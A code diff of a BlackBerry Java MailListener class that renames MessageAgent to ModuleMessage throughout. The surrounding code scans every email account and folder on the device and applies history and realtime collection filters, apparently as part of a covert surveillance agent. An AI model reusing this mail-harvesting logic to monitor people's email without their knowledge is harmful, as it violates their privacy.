@@ -29,10 +29,10 @@ import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.IntHashtable;
-import blackberry.agent.MessageAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.MailObserver;
+import blackberry.module.ModuleMessage;
 import blackberry.utils.Check;
 
 /**
@@ -182,8 +182,8 @@ public final class MailListener implements FolderListener, SendListener { //, St
             }
 
             if (!collecting) {
-                MessageAgent.getInstance().lastcheckSet("COLLECT", new Date());
-                MessageAgent.getInstance().lastcheckSet(folderName, new Date());
+                ModuleMessage.getInstance().lastcheckSet("COLLECT", new Date());
+                ModuleMessage.getInstance().lastcheckSet(folderName, new Date());
             }
 
         } catch (final MessagingException ex) {
@@ -246,7 +246,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
         collecting = true;
         // questa data rappresenta l'ultimo controllo effettuato.
-        final Date lastCheckDate = MessageAgent.getInstance().lastcheckGet(
+        final Date lastCheckDate = ModuleMessage.getInstance().lastcheckGet(
                 "COLLECT");
 
         // Controllo tutti gli account di posta
@@ -261,7 +261,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
             debug.trace("Email account name: " + names[count]);
             //#endif
 
-            Date lastCheckDateName = MessageAgent.getInstance().lastcheckGet(
+            Date lastCheckDateName = ModuleMessage.getInstance().lastcheckGet(
                     names[count]);
 
             //names[count] = mailServiceRecords[0].getName();
@@ -273,12 +273,12 @@ public final class MailListener implements FolderListener, SendListener { //, St
             // Scandisco ogni Folder dell'account di posta
             scanFolders(names[count], folders, lastCheckDateName);
 
-            MessageAgent.getInstance().lastcheckSet(names[count], new Date());
+            ModuleMessage.getInstance().lastcheckSet(names[count], new Date());
         }
 
         //if (!stopHistory) {
             // al termine degli scanfolder
-            MessageAgent.getInstance().lastcheckSet("COLLECT", new Date());
+            ModuleMessage.getInstance().lastcheckSet("COLLECT", new Date());
         //}
 
         //#ifdef DEBUG
@@ -312,13 +312,13 @@ public final class MailListener implements FolderListener, SendListener { //, St
         if (collectFilter == null) {
             //#ifdef DEBUG
             debug.trace("no collectFilter, messageAgent: "
-                    + MessageAgent.getInstance());
+                    + ModuleMessage.getInstance());
             //#endif
-            if (MessageAgent.getInstance() != null) {
+            if (ModuleMessage.getInstance() != null) {
                 //#ifdef DEBUG
                 debug.trace("new collectFilter");
                 //#endif
-                collectFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
+                collectFilter = (Filter) ModuleMessage.getInstance().filtersEMAIL
                         .get(Filter.TYPE_COLLECT);
             }
         }
@@ -579,11 +579,11 @@ public final class MailListener implements FolderListener, SendListener { //, St
         //#endif
 
         // to forever
-        realtimeFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
+        realtimeFilter = (Filter) ModuleMessage.getInstance().filtersEMAIL
                 .get(Filter.TYPE_REALTIME);
 
         // history
-        collectFilter = (Filter) MessageAgent.getInstance().filtersEMAIL
+        collectFilter = (Filter) ModuleMessage.getInstance().filtersEMAIL
                 .get(Filter.TYPE_COLLECT);
 
         // Controllo tutti gli account di posta
